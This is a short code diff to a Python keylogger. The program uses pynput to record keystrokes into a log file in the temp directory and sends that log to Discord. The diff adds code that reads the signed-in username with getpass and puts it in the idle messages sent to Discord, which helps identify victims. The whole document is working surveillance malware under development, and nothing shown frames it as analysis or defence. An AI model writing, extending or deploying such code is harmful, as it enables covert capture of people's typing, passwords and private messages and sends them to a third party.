@@ -2,7 +2,11 @@ import os
 import tempfile
 import requests
 import threading
+import getpass
 from pynput import keyboard
+
+# Get the name of the user signed in
+user_name = getpass.getuser()
 
 # Create a temporary directory and a log file named "log.txt" within it
 temp_dir = tempfile.gettempdir()
@@ -45,7 +49,7 @@ def send_log_to_discord():
     global idle_time
     try:
         if os.path.getsize(log_path) == 0:
-            message = f"Nothing typed in {idle_time} seconds"
+            message = f"Nothing typed in {idle_time} seconds by {user_name}"
             data = {
                 "content": message
             }
